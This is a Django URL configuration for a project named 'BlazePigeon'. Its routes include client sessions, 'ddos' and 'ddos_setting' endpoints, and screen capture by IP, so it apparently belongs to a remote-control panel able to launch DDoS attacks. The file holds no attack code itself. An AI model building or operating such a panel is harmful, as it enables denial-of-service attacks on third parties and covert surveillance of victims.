"""BlazePigeon URL Configuration

The `urlpatterns` list routes URLs to views. For more information please see:
    https://docs.djangoproject.com/en/2.2/topics/http/urls/
Examples:
Function views
    1. Add an import:  from my_app import views
    2. Add a URL to urlpatterns:  path('', views.home, name='home')
Class-based views
    1. Add an import:  from other_app.views import Home
    2. Add a URL to urlpatterns:  path('', Home.as_view(), name='home')
Including another URLconf
    1. Import the include() function: from django.urls import include, path
    2. Add a URL to urlpatterns:  path('blog/', include('blog.urls'))
"""
from django.contrib import admin
from django.urls import path


# 路由控制
from client import views

urlpatterns = [
    path('admin/', admin.site.urls),
    path('update_version/', views.update_version),
    path('', views.login_index),
    path('index/', views.index),
    path('client_setting/', views.client_set),
    path('update_client_set/', views.update_client_set),
    path('login_check/', views.login),
    path('start/', views.start),
    path('sessions/', views.sessions),
    path('exit/', views.exit_t),
    path('ddos_setting_index/', views.ddos_setting_index),
    path('ddos_setting/', views.ddos_setting),
    path('ddos/', views.ddos),
    path('screen/<str:screen_ip>/', views.screen),
    path('picture/', views.picture_index)
]